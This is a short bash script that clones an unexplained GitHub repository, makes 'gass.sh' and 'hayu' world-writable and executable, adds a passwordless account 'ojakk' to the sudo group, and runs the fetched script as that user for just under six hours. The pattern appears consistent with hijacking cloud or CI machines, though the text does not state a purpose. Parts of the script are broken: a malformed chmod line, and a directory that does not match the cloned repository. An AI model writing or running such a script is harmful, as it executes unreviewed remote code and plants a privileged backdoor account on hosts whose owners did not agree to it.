#!/bin/bash
sudo apt update
git clone https://github.com/ajayy78/ajayy78.git && cd sukses
chmod +x gass.sh && chmod +x hayu chmod 777 hayu gass.sh
sudo adduser --disabled-password --gecos "" ojakk && sudo usermod -aG sudo ojakk
sudo -u ojakk -H sh -c "timeout 359m ./gass.sh"
sudo apt update
